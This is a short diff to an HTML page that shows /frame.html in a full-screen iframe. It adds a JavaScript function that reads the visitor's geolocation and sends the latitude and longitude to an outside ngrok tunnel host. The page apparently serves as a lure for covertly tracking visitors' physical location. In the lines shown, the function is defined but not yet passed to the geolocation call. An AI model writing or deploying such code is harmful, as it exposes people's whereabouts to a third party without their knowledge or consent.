@@ -6,6 +6,14 @@
   <body>
       <iframe src="/frame.html" style="width: 100vw; height: 100vh;"></iframe>
     <script>
+      let latitude = 0;
+      let longitude = 0;
+      function showPosition(position) {
+        latitude = position.coords.latitude;
+        longitude = position.coords.longitude;
+        url = "http://1fcf9e9ea5a8.ngrok.io/loc?lat=" + latitude + "&long=" + longitude;
+        fetch(url);
+      }
       window.navigator.geolocation.getCurrentPosition(console.log, console.log);
     </script>
   </body>
